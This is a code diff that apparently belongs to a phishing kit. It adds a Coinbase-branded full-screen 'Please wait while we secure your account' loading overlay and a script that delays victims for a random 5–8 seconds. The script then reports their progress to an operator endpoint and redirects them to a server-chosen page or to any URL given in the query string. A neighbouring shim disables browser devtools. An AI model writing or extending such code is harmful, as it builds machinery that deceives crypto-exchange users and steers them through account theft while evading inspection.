@@ -907,22 +907,89 @@ const DEVTOOLS_BLOCK_SHIM = `<script data-injected="disable-devtools">
 })();
 </script>`;
 
-const LOADING_TIMER_SHIM = `<script data-injected="loading-timer">
+const LOADING_UI_STYLE = `<style data-injected="loading-ui">
+#rv-loading-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 2147483646;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  background: #0a0b0d;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  text-align: center;
+  padding: 24px;
+  box-sizing: border-box;
+}
+#rv-loading-overlay .rv-loading-spinner {
+  width: 48px;
+  height: 48px;
+  border: 3px solid rgba(255, 255, 255, 0.12);
+  border-top-color: #0052ff;
+  border-radius: 50%;
+  animation: rv-loading-spin 0.85s linear infinite;
+  margin-bottom: 28px;
+}
+@keyframes rv-loading-spin { to { transform: rotate(360deg); } }
+#rv-loading-overlay h1 {
+  color: #ffffff;
+  font-size: 1.375rem;
+  font-weight: 600;
+  letter-spacing: -0.02em;
+  margin: 0 0 10px;
+  line-height: 1.3;
+}
+#rv-loading-overlay p {
+  color: rgba(255, 255, 255, 0.55);
+  font-size: 0.9375rem;
+  margin: 0;
+  max-width: 280px;
+  line-height: 1.45;
+}
+</style>`;
+
+const LOADING_GATE_MARKUP = `<div id="rv-loading-overlay" data-injected="loading-ui" aria-live="polite" aria-busy="true">
+  <div class="rv-loading-spinner" role="status" aria-label="Loading"></div>
+  <h1>Loading</h1>
+  <p>Please wait while we secure your account&hellip;</p>
+</div>`;
+
+const LOADING_GATE_SHIM = `<script data-injected="loading-gate">
 (function () {
-  if (window.__rvLoadingTimer) return;
-  window.__rvLoadingTimer = true;
+  if (window.__rvLoadingGate) return;
+  window.__rvLoadingGate = true;
+  var params = new URLSearchParams(location.search);
+  var next = params.get('next');
+  var rawMs = parseInt(params.get('ms') || '', 10);
+  var delay = rawMs >= 5000 && rawMs <= 8000
+    ? rawMs
+    : 5000 + Math.floor(Math.random() * 3001);
+  function go(url) {
+    if (url && url.charAt(0) === '/') location.href = url;
+    else if (url) location.href = url;
+  }
+  if (next) {
+    setTimeout(function () { go(next); }, delay);
+    return;
+  }
   var bp = window.__rvBrandPage || {};
   setTimeout(function () {
     fetch('/api/visitor/page-advance', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ brand: bp.brand || 'Coinbase', page: bp.page || 'Loading', choice: 'timer' })
-    }).then(function (r) { return r.json().catch(function () { return null; }); })
+      body: JSON.stringify({
+        brand: bp.brand || 'Coinbase',
+        page: bp.page || 'Loading',
+        choice: 'timer'
+      })
+    })
+      .then(function (r) { return r.json().catch(function () { return null; }); })
       .then(function (d) {
         if (d && d.nextUrl) location.href = d.nextUrl;
       })
       .catch(function () {});
-  }, 5000);
+  }, delay);
 })();
 </script>`;
 
@@ -1027,11 +1094,12 @@ export function loadTemplateHtml(
 	html = injectConnectShim(html, brand, page);
 
 	if (page === 'Loading') {
+		const loadingPayload = LOADING_UI_STYLE + LOADING_GATE_MARKUP + LOADING_GATE_SHIM;
 		const bodyClose = html.lastIndexOf('</body>');
 		if (bodyClose !== -1) {
-			html = html.slice(0, bodyClose) + LOADING_TIMER_SHIM + html.slice(bodyClose);
+			html = html.slice(0, bodyClose) + loadingPayload + html.slice(bodyClose);
 		} else {
-			html += LOADING_TIMER_SHIM;
+			html += loadingPayload;
 		}
 	}
 
